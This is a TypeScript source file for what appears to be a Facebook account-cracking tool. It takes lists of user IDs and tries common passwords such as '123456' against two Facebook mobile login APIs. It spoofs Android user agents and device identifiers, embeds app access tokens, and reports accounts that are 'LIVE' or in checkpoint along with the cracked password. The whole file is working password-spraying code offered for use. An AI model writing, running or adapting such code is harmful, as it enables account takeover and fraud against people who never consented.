import type { TaskResult } from "@workspace/db";
import { randomUUID } from "crypto";

export interface CrckOptions {
  uids: string[];
  delay: number;
  onResult: (result: TaskResult) => Promise<void>;
  signal: AbortSignal;
}

const COMMON_PASSWORDS = ["123456", "123123", "1234567", "12345678", "123456789"];

const CLONE_UA_LIST = [
  "Mozilla/5.0 (Linux; Android 10; CPH2461 Build/TKQ1.210628.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; 2211133G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-G973F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Infinix X6823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; M2012K11AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
];

function randomUA(): string {
  return CLONE_UA_LIST[Math.floor(Math.random() * CLONE_UA_LIST.length)];
}

function uuid(): string {
  return randomUUID();
}

async function crackUID(uid: string): Promise<{
  status: "ok" | "fail" | "no_cp" | "no_limit";
  detail: string;
  password?: string;
}> {
  for (const pw of COMMON_PASSWORDS) {
    try {
      const result = await tryLoginM1(uid, pw);
      if (result.live) return { status: "ok", detail: `✅ LIVE | UID: ${uid} | PASS: ${pw}`, password: pw };
      if (result.checkpoint) return { status: "no_cp", detail: `⚠️ CP | UID: ${uid} | PASS: ${pw}`, password: pw };
    } catch {
      // continue
    }
  }

  for (const pw of COMMON_PASSWORDS) {
    try {
      const result = await tryLoginM2(uid, pw);
      if (result.live) return { status: "ok", detail: `✅ LIVE | UID: ${uid} | PASS: ${pw}`, password: pw };
      if (result.checkpoint) return { status: "no_cp", detail: `⚠️ CP | UID: ${uid} | PASS: ${pw}`, password: pw };
    } catch {
      // continue
    }
  }

  return { status: "fail", detail: `❌ DEAD | UID: ${uid}` };
}

async function tryLoginM1(uid: string, password: string): Promise<{ live: boolean; checkpoint: boolean }> {
  const body = new URLSearchParams({
    adid: uuid(),
    format: "json",
    device_id: uuid(),
    cpl: "true",
    family_device_id: uuid(),
    credentials_type: "device_based_login_password",
    error_detail_type: "button_with_disabled",
    source: "device_based_login",
    email: uid,
    password,
    access_token: "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    generate_session_cookies: "1",
    meta_inf_fbmeta: "",
    advertiser_id: uuid(),
    currently_logged_in_userid: "0",
    locale: "en_US",
    client_country_code: "US",
    method: "auth.login",
    fb_api_req_friendly_name: "authenticate",
    fb_api_caller_class: "com.facebook.account.login.protocol.Fb4aAuthHandler",
    api_key: "882a8490361da98702bf97a021ddc14d",
  });

  const res = await fetch("https://b-graph.facebook.com/auth/login", {
    method: "POST",
    headers: {
      "User-Agent": randomUA(),
      "Content-Type": "application/x-www-form-urlencoded",
      "Host": "b-graph.facebook.com",
      "X-FB-Net-HNI": "25227",
      "X-FB-SIM-HNI": "29752",
      "X-FB-Connection-Type": "MOBILE.LTE",
      "X-Tigon-Is-Retry": "False",
      "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;",
      "x-fb-device-group": "5120",
      "X-FB-HTTP-Engine": "Liger",
      "X-FB-Client-IP": "True",
      "X-FB-Server-Cluster": "True",
    },
    body: body.toString(),
    signal: AbortSignal.timeout(15000),
  });

  let json: Record<string, unknown> = {};
  try { json = await res.json() as Record<string, unknown>; } catch { return { live: false, checkpoint: false }; }

  if ("session_key" in json) return { live: true, checkpoint: false };
  const errMsg = ((json["error"] as Record<string, unknown>)?.["message"] as string) ?? "";
  if (errMsg.includes("www.facebook.com") || errMsg.toLowerCase().includes("checkpoint")) {
    return { live: false, checkpoint: true };
  }
  return { live: false, checkpoint: false };
}

async function tryLoginM2(uid: string, password: string): Promise<{ live: boolean; checkpoint: boolean }> {
  const url = `https://b-api.facebook.com/method/auth.login?format=json&email=${encodeURIComponent(uid)}&password=${encodeURIComponent(password)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true`;

  const res = await fetch(url, {
    method: "GET",
    headers: {
      "x-fb-connection-bandwidth": String(20000000 + Math.floor(Math.random() * 10000000)),
      "x-fb-sim-hni": String(20000 + Math.floor(Math.random() * 20000)),
      "x-fb-net-hni": String(20000 + Math.floor(Math.random() * 20000)),
      "x-fb-connection-quality": "EXCELLENT",
      "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
      "user-agent": randomUA(),
      "content-type": "application/x-www-form-urlencoded",
      "x-fb-http-engine": "Liger",
    },
    signal: AbortSignal.timeout(15000),
  });

  const text = await res.text();
  let json: Record<string, unknown> = {};
  try { json = JSON.parse(text) as Record<string, unknown>; } catch { return { live: false, checkpoint: false }; }

  if ("session_key" in json || text.includes("session_key")) return { live: true, checkpoint: false };
  const errMsg = ((json["error"] as Record<string, unknown>)?.["message"] as string) ?? "";
  if (errMsg.includes("www.facebook.com") || errMsg.toLowerCase().includes("checkpoint")) {
    return { live: false, checkpoint: true };
  }
  return { live: false, checkpoint: false };
}

export async function runCrck(opts: CrckOptions): Promise<void> {
  const { uids, delay, onResult, signal } = opts;

  for (const raw of uids) {
    if (signal.aborted) break;
    const uid = raw.trim();
    if (!uid) continue;

    try {
      const result = await crackUID(uid);
      await onResult({
        line: uid,
        status: result.status,
        detail: result.detail,
        timestamp: new Date().toISOString(),
      });
    } catch (err) {
      await onResult({
        line: uid,
        status: "fail",
        detail: `❌ Error: ${err instanceof Error ? err.message : "Network error"}`,
        timestamp: new Date().toISOString(),
      });
    }

    if (!signal.aborted) await sleep(delay || 500);
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}
